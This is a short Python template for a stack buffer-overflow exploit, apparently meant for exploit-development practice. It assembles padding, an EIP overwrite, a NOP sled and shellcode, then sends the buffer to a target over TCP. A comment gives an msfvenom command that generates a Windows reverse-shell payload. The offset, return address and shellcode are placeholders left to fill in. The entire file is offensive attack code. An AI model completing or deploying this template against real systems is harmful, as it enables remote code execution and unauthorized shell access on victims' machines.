#!/usr/bin/python
#author: pr0rat
#twitter: @pr0rat

import socket
import sys

try:
 print("[+] \nSending evil buffer...")
 offset="A"*XXX
 nops = "\x90" * 10 

 #write your eip in reverse
 #EXAMPLE eip="\xf3\x12\x17\x34"
 eip=""
 #generate your shellcode using msfvenom
 #msfvenom -p windows/shell_reverse_tcp LHOST=TARGETIP LPORT=4444 EXITFUNC=thread -f c -a x86 -b "PUT_YOUR_FOUND _BADCHARS HERE"
 shellcode="PASTE_SHELLCODE_HERE" 
 buffer = offset+eip+nops+shellcode
 s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)

 s.connect(("TARGETIP", PORT))
 s.send(buffer)
  
 s.close()

 print("\n[+] Sending buffer of " + str(len(buffer)) + " bytes...")
 print("\n[+] Sending buffer: " + buffer)
 print("\n[+] Done!")
  
except:
 print("\n[+] Could not connect!")
 sys.exit